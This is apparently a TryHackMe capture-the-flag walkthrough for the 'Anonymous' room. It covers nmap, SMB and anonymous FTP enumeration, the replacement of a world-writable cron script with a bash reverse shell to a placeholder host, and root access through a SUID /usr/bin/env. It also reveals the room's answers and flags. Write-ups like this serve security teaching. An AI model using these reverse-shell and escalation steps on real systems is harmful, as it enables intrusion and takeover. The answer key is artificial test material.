# Anonymous — TryHackMe Walkthrough

> Not the hacking group. Root the machine and prove your understanding of the fundamentals!

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/WNyThS3C/876a5185c429c9703e625cb48c39637b.png" alt="876a5185c429c9703e625cb48c39637b" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/anonymous">
    <img src="https://img.shields.io/badge/TryHackMe-Anonymous-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-FTP%20%7C%20SMB%20%7C%20Cron%20Abuse%20%7C%20SUID-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | SMB Enumeration |
| 3 | FTP Enumeration |
| 4 | Security Misconfiguration — Writable Cron Script |
| 5 | Abusing SUID/GUID — `/usr/bin/env` |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Perform a full port scan and enumerate both FTP and SMB services
- Connect to an anonymous FTP share and download files for analysis
- Identify a cron-executed shell script that is world-writable
- Overwrite the script with a reverse shell to gain initial access
- Search for SUID binaries and exploit `/usr/bin/env` to escalate to root

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, smbclient, and Netcat installed
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Pwn

---

### Step 1 — Network Enumeration

**Approach:** Run a full port scan (`-p-`) with service detection, default scripts, and OS fingerprinting to identify all open services.

```
kali@kali:~/CTFs/tryhackme/Anonymous$ sudo nmap -p- -sS -sC -sV -Pn -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 15:47 CEST
Nmap scan report for Machine_IP
Host is up (0.039s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.106.222
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|_  System time: 2020-10-09T14:00:35+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 794.23 seconds
```

> **Note:** Four ports are open — **FTP on 21**, **SSH on 22**, and **Samba SMB on 139 and 445**. Nmap immediately flags two critical findings: anonymous FTP login is allowed, and the `scripts` directory inside the FTP share has `drwxrwxrwx` permissions — meaning it is **world-writable**. This is the key attack vector for this room.

---

### Question 1 — How many ports are open?

<details>
<summary>Reveal Answer</summary>

**`4`**

</details>

---

### Question 2 — What service is running on port 21?

<details>
<summary>Reveal Answer</summary>

**`FTP`**

</details>

---

### Question 3 — What service is running on ports 139 and 445?

<details>
<summary>Reveal Answer</summary>

**`SMB`**

</details>

---

### Step 2 — SMB Share Enumeration

**Approach:** Use `smbclient` with the `-L` flag to list available shares on the target without credentials.

```
kali@kali:~/CTFs/tryhackme/Anonymous$ smbclient -L Machine_IP
Enter WORKGROUP\kali's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

> **Note:** Three shares are listed. `pics` is a user share containing pictures — connect with `smbclient //Machine_IP/pics` to browse it. `IPC$` is an internal Samba service share. `print$` handles printer drivers. The `pics` share is the only user-facing one worth exploring for credentials or additional clues.

---

### Question 4 — What is the share on the user's computer called?

<details>
<summary>Reveal Answer</summary>

**`pics`**

</details>

---

### Step 3 — FTP Enumeration and File Download

**Approach:** Connect to the FTP server anonymously. Navigate into the `scripts` directory and download all three files for analysis.

```
kali@kali:~/CTFs/tryhackme/Anonymous$ ftp Machine_IP
Connected to Machine_IP.
220 NamelessOne's FTP Server!
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1677 Oct 09 14:05 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> mget *
...
ftp> exit
221 Goodbye.
```

> **Note:** Three files are inside the `scripts` directory. The critical one is `clean.sh` — it has permissions `-rwxr-xrwx`, meaning it is **world-writable** (the final `w`). The `removed_files.log` is being actively written to, suggesting `clean.sh` is running on a schedule — likely a cron job. The `to_do.txt` confirms this is a cleanup script. This is the escalation path: overwrite `clean.sh` with a reverse shell, wait for the cron job to execute it, and catch the shell.

The current contents of `clean.sh`:

```sh
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

---

### Step 4 — Overwriting clean.sh with a Reverse Shell

**Approach:** Create a new `clean.sh` locally containing a bash reverse shell, then upload it to the FTP server to overwrite the original. Start a Netcat listener and wait for the cron job to trigger.

Create the malicious script locally:

```sh
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

Upload it via FTP:

```
ftp> put clean.sh
```

Start the listener:

```
kali@kali:~/CTFs/tryhackme/Anonymous$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.106.222] from (UNKNOWN) [Machine_IP] ...
namelessone@anonymous:~$
```

```
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

> **Note:** The cron job fires and executes the overwritten `clean.sh` as the user who owns the script — `namelessone`. The reverse shell connects back. The user flag is found directly in the home directory. The username `namelessone` is a nod to the room's theme.

---

### Question 5 — user.txt

<details>
<summary>Reveal Answer</summary>

**`90d6f992585815ff991e68748c414740`**

</details>

---

### Step 5 — Privilege Escalation via SUID env

**Approach:** Search for all SUID binaries owned by root. Look for anything unusual — particularly common utilities that should not normally have the SUID bit set.

```
namelessone@anonymous:~$ find / -user root -perm -u=s 2>/dev/null
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
...
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/pkexec
```

> **Note:** `/usr/bin/env` stands out — it should not have the SUID bit set. `env` is a utility that runs a command in a modified environment. With the SUID bit set and owned by root, using `env` to execute `/bin/sh -p` spawns a shell that inherits root's effective UID. The `-p` flag preserves privileges when the effective UID differs from the real UID, which is exactly what happens with SUID. This is documented at [GTFOBins/env](https://gtfobins.github.io/gtfobins/env/#suid).

```
namelessone@anonymous:~$ env /bin/sh -p

whoami
root
cd /root
cat root.txt
4d930091c31a622a7ed10f27999af363
```

> **Note:** The `env /bin/sh -p` command immediately drops into a root shell. The `whoami` output confirms root access. The root flag is found directly in `/root/root.txt`.

---

### Question 6 — root.txt

<details>
<summary>Reveal Answer</summary>

**`4d930091c31a622a7ed10f27999af363`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap full port scan (`-p-`) | Found FTP (21), SSH (22), SMB (139/445) — FTP `scripts` dir world-writable |
| 2 | SMB share enumeration | Found `pics` share |
| 3 | Anonymous FTP login | Downloaded `clean.sh`, `removed_files.log`, `to_do.txt` |
| 4 | Identified `clean.sh` as world-writable and cron-executed | Confirmed escalation path |
| 5 | Overwrote `clean.sh` with reverse shell via FTP `put` | Caught shell as `namelessone`, read `user.txt` |
| 6 | `find` SUID binary search | Found `/usr/bin/env` with SUID bit set |
| 7 | `env /bin/sh -p` | Spawned root shell, read `root.txt` |
